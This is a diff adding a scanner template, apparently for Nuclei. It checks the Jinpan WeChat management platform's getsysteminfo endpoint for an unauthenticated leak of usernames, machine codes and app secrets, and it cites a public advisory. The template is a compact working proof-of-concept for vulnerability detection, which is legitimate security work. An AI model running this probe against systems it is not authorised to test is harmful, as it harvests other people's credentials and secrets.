@@ -1,0 +1,22 @@
+id: jinpan-wx-getsysteminfo-info-leak
+info:
+  name: 金盘 微信管理平台 getsysteminfo 接口 - 信息泄露漏洞
+  author: xiaobaicai
+  severity: medium
+  reference:
+    - https://www.ddpoc.com/poc/DVB-2023-4585.html
+  metadata:
+    verified: true
+    max-request: 1
+    vendor: jinpan
+    product: wx
+  tags: info-leak,vuln,jinpan
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/admin/weichatcfg/getsysteminfo'
+    redirects: false
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && contains(body, "\"username\"") && contains(body, "\"username\"") && contains(body, "\"machinecode\"") && contains(body, "{\"id\"") && contains(body, "\"appsecret\"")'
